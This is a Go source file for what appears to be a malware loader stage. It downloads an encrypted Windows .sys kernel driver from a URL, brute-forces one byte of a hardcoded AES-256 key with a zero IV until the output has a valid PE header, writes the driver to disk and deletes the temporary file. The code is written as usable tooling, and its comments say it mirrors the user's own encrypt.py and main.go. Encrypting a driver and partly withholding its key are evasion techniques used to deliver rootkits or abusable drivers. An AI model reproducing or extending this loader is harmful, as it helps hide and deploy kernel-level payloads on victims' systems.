package crypto

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"os"
)

// AES encryption constants from your working encrypt.py and main.go
const (
	KEYSIZE = 32 // AES-256
	IVSIZE  = 16 // AES block size
)

// BaseAESKey - The working key from your encrypt.py (0x1E first byte)
// Your main.go brute forces from 0x00 and will find 0x1E at iteration 30
var BaseAESKey = []byte{
	0x1E, 0x3E, 0x4C, 0x6F, 0xD9, 0x12, 0x83, 0x7A,
	0xA4, 0x6E, 0xA0, 0x50, 0x53, 0x28, 0xED, 0x7B,
	0xB2, 0x0E, 0xD2, 0x3B, 0x37, 0x28, 0xA4, 0xEF,
	0x78, 0x22, 0x88, 0x0B, 0xE8, 0xD0, 0xBE, 0x45,
}

// BruteForceAESKey - Base key for brute forcing (first byte set to 0x00)
// This matches your main.go approach exactly
var BruteForceAESKey = []byte{
	0x00, // first byte to brute-force
	0x3E, 0x4C, 0x6F, 0xD9, 0x12, 0x83, 0x7A,
	0xA4, 0x6E, 0xA0, 0x50, 0x53, 0x28, 0xED, 0x7B,
	0xB2, 0x0E, 0xD2, 0x3B, 0x37, 0x28, 0xA4, 0xEF,
	0x78, 0x22, 0x88, 0x0B, 0xE8, 0xD0, 0xBE, 0x45,
}

// DecryptData - AES-CBC decryption with PKCS#7 padding removal (EXACT from your main.go)
func DecryptData(cipherText, key, iv []byte) ([]byte, error) {
	if len(cipherText)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("cipherText is not a multiple of block size")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plainText := make([]byte, len(cipherText))
	mode.CryptBlocks(plainText, cipherText)

	// PKCS#7 padding removal - EXACT implementation from your main.go
	padding := int(plainText[len(plainText)-1])
	if padding <= 0 || padding > aes.BlockSize {
		return nil, fmt.Errorf("invalid padding")
	}
	plainText = plainText[:len(plainText)-padding]

	return plainText, nil
}

// IsValidSysFile - Validate PE / .sys driver in memory (EXACT from your main.go)
func IsValidSysFile(data []byte) bool {
	if len(data) < 64 {
		return false
	}
	if !bytes.Equal(data[:2], []byte("MZ")) { // DOS header
		return false
	}
	peOffset := binary.LittleEndian.Uint32(data[0x3C:0x40])
	if int(peOffset+4) >= len(data) {
		return false
	}
	if !bytes.Equal(data[peOffset:peOffset+4], []byte("PE\x00\x00")) {
		return false
	}
	return true
}

// DownloadFile - Download file from URL (EXACT from your main.go)
func DownloadFile(url, filePath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

// ReadFileBytes - Helper: read file to memory (EXACT from your main.go)
func ReadFileBytes(path string) ([]byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return nil, err
	}

	data := make([]byte, info.Size())
	_, err = f.Read(data)
	return data, err
}

// BruteForceDecryptDriver - Complete brute force decryption workflow (EXACT from your main.go)
func BruteForceDecryptDriver(encryptedPath, outputPath string) (bool, error) {
	// Create base key for brute forcing (first byte starts at 0x00)
	baseKey := make([]byte, KEYSIZE)
	copy(baseKey, BruteForceAESKey)
	
	// Zero IV as used in your encrypt.py
	iv := make([]byte, IVSIZE)

	// Read encrypted file into memory
	cipherData, err := ReadFileBytes(encryptedPath)
	if err != nil {
		return false, fmt.Errorf("failed to read encrypted file: %v", err)
	}

	// Brute force first byte (0-255)
	for i := 0; i < 256; i++ {
		baseKey[0] = byte(i)
		plainData, err := DecryptData(cipherData, baseKey, iv)
		if err != nil {
			continue // Invalid decryption, try next key
		}

		// Validate if decrypted data is a valid .sys driver
		if IsValidSysFile(plainData) {
			// Save valid driver to output path
			err = os.WriteFile(outputPath, plainData, 0644)
			if err != nil {
				return false, fmt.Errorf("failed to write decrypted driver: %v", err)
			}
			fmt.Printf("[+] Valid driver found with key first byte: 0x%02X\n", i)
			return true, nil
		}
	}

	return false, fmt.Errorf("failed to decrypt valid driver after 256 attempts")
}

// DownloadAndDecryptDriver - Complete workflow: download + brute force decrypt
func DownloadAndDecryptDriver(downloadURL, tempPath, outputPath string) error {
	fmt.Printf("[*] Downloading encrypted driver from: %s\n", downloadURL)
	
	// Download encrypted driver
	if err := DownloadFile(downloadURL, tempPath); err != nil {
		return fmt.Errorf("download failed: %v", err)
	}
	defer os.Remove(tempPath) // Clean up temp file

	fmt.Printf("[*] Starting brute force decryption...\n")
	
	// Brute force decrypt the driver
	success, err := BruteForceDecryptDriver(tempPath, outputPath)
	if err != nil {
		return fmt.Errorf("decryption failed: %v", err)
	}
	
	if !success {
		return fmt.Errorf("no valid driver found after brute force decryption")
	}

	fmt.Printf("[+] Driver successfully decrypted and saved to: %s\n", outputPath)
	return nil
}
